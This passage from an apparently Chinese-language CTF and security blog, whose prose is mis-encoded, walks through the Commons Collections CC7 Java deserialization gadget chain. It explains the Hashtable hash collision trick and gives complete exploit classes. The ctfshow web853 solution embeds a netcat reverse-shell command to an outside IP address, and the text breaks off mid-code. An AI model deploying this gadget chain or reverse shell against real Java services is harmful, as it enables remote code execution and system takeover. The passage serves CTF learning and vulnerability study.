href="#æŒ‡å®škeyçš„å€¼" class="headerlink" title="æŒ‡å®škeyçš„å€¼"></a>æŒ‡å®škeyçš„å€¼</h2><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906172408833.png" alt="image-20240906172408833"></p><p><code>table[1]</code>æ˜¯ decorateMap2 çš„å€¼ï¼Œè€Œç´¢å¼•ä¹‹æ‰€ä»¥æ˜¯1ä¹Ÿæ˜¯ä»<code>int index = (hash &amp; 0x7FFFFFFF) % tab.length;</code>æ¥çš„ï¼Œè€Œ decorateMap1 çš„keyï¼ˆå³&quot;aaa&quot;ï¼‰ç»è¿‡hashå¤„ç†ä¹‹åä¸º 96320ï¼ŒdecorateMap2 çš„keyï¼ˆ&quot;bbb&quot;ï¼‰çš„hashæ˜¯97315ï¼Œä¸¤è€…å¾—åˆ°çš„indexä¸ç›¸ç­‰ï¼Œæ‰€ä»¥è¿ for å¾ªç¯éƒ½è¿›ä¸å»</p><p>é‚£ä¹ˆè¦è®©<code>(hash &amp; 0x7FFFFFFF) % tab.length</code>ç›¸ç­‰ï¼Œè¿™æ ·æ‰èƒ½åŒ¹é…ä¸Šindexï¼Œè€Œä¸”æ³¨æ„åˆ°ä¸‹é¢è¿˜æœ‰<code>e.hash == hash</code>çš„åˆ¤æ–­ï¼Œå› æ­¤é—®é¢˜å°±è½¬å˜ä¸ºå¦‚ä½•è®©è¿™ä¸¤ä¸ª key çš„ hash ç›¸ç­‰</p><p>åœ¨javaä¸­æœ‰è¿™æ ·çš„ä¸€ä¸ªç‰¹æ€§ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token string">"yy"</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"zZ"</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>yy</code> å’Œ <code>zZ</code> ç”± <code>hashCode()</code> è®¡ç®—å‡ºæ¥çš„å€¼æ˜¯ä¸€æ ·çš„ã€‚æ­£æ˜¯è¿™ä¸ªå° bug è®©è¿™é‡Œèƒ½å¤Ÿåˆ©ç”¨ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦å°† map ä¸­ <code>put()</code> çš„å€¼è®¾ç½®ä¸º <code>yy</code> å’Œ <code>zZ</code>ï¼Œæ‰èƒ½èµ°åˆ°æˆ‘ä»¬æƒ³è¦çš„ <code>e.key.equals()</code> æ–¹æ³•ä¸­</p><p>æ‰€ä»¥è¦è¿™æ ·å†™ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906173304535.png" alt="image-20240906173304535"></p><p>ç„¶åå°±è°ƒç”¨<code>decorateMap1.equals(decorateMap2)</code></p><p>ä¸è¿‡è¿™æ ·è¿˜æ˜¯å¼¹ä¸äº†è®¡ç®—å™¨</p><h2 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h2><p>è¿™æ˜¯å› ä¸º <code>HashTable.put()</code> å®é™…ä¸Šä¹Ÿä¼šè°ƒç”¨åˆ° <code>equals()</code> æ–¹æ³•</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906173615414.png" alt="image-20240906173615414"></p><p>å½“è°ƒç”¨å®Œ <code>equals()</code> æ–¹æ³•åï¼ŒdecorateMap2 çš„ key ä¸­å°±ä¼šå¢åŠ ä¸€ä¸ª yy é”®ï¼Œç„¶ååœ¨ AbstractMap è¿™é‡Œæ‰§è¡Œ <code>value.equals(m.get(key))</code> æ—¶å–åˆ°çš„keyæ˜¯ yy</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906175652192.png" alt="image-20240906175652192"></p><p>è€ŒAbstractMapé‡Œçš„keyæ˜¯ä»€ä¹ˆå‘¢</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906175842781.png" alt="image-20240906175842781"></p><p>ç”±äºæˆ‘ä»¬æ˜¯å…ˆè°ƒç”¨äº† HashMap é‡Œçš„ equals åæ‰åˆ°çš„ AbstractMap ï¼Œå› æ­¤è¿™ä¸ª entryset ä¹Ÿå°±æ˜¯ HashMap çš„ï¼ŒdecorateMap1 é‡Œæ”¾çš„å°±æ˜¯ HashMap1ï¼Œé‡Œé¢çš„é”®æ˜¯ yy</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906181016837.png" alt="image-20240906181016837"></p><p>äºæ˜¯åœ¨è¿™ä¹‹å decorateMap2 çš„ key ä¸­å°±ä¼šå¢åŠ ä¸€ä¸ª yy é”®ï¼Œè¿™å°±ä¸èƒ½æ»¡è¶³ hash ç¢°æ’äº†ï¼Œæ„é€ åºåˆ—åŒ–é“¾çš„æ—¶å€™æ˜¯æ»¡è¶³çš„ï¼Œä½†æ˜¯æ„é€ å®Œæˆä¹‹åå°±ä¸æ»¡è¶³äº†ï¼Œé‚£ä¹ˆç»è¿‡å¯¹æ–¹æœåŠ¡å™¨ååºåˆ—åŒ–ä¹Ÿä¸èƒ½æ»¡è¶³ hash ç¢°æ’äº†ï¼Œä¹Ÿå°±ä¸ä¼šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ï¼Œæ‰€ä»¥å°±åœ¨æ„é€ å®Œåºåˆ—åŒ–é“¾ä¹‹åæ‰‹åŠ¨åˆ é™¤è¿™å¤šå‡ºæ¥çš„ä¸€ç»„é”®å€¼å¯¹</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">decorateMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h1><p>ä¸ºäº†é˜²æ­¢åºåˆ—åŒ–æå‰å¼¹è®¡ç®—å™¨ï¼Œè¦æ”¹ä¸€ä¸‹ chainedTransformer ä¸º<code>ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);</code>ï¼Œåé¢å†åå°„èµ‹å€¼</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc7</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span><span class="token string">"iTransformers"</span><span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="å®æˆ˜"><a href="#å®æˆ˜" class="headerlink" title="å®æˆ˜"></a>å®æˆ˜</h1><h2 id="ctfshow-web853"><a href="#ctfshow-web853" class="headerlink" title="ctfshow web853"></a>ctfshow web853</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">æäº¤ctfshowå‚æ•°è¿›è¡Œbase64è§£ç ç„¶åè¿›è¡Œååºåˆ—åŒ–æˆ‘æ˜¯java8ï¼Œä½¿ç”¨äº†commons<span class="token operator">-</span>collections <span class="token number">4.0</span>çš„åº“å¹¶å¯¹ä¸€äº›å¯èƒ½æœ‰å±é™©çš„ç±»è¿›è¡Œäº†å°ç¦ï¼Œä¸ºäº†ä¿è¯ä¸šåŠ¡å®‰å…¨ï¼Œæˆ‘åˆ é™¤äº†ncå’Œcurlå‘½ä»¤ä¸‹é¢æ˜¯æˆ‘æ¥æ”¶å‚æ•°çš„ä»£ç data<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BASE64Decoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decodeBuffer</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æµ‹è¯•å‘ç°å¾—ç”¨cc7æ‰“ï¼Œé‚£æ¢æˆcc4.0çš„åº“å°±è¡Œ</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc7</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> cc7Ver4 <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"nc 115.236.153.177 30908 -e /bin/sh"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">lazyMap</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">lazyMap</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>SetValue</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span><span class="token string">"iTransformers"</span><span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        decorateMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token 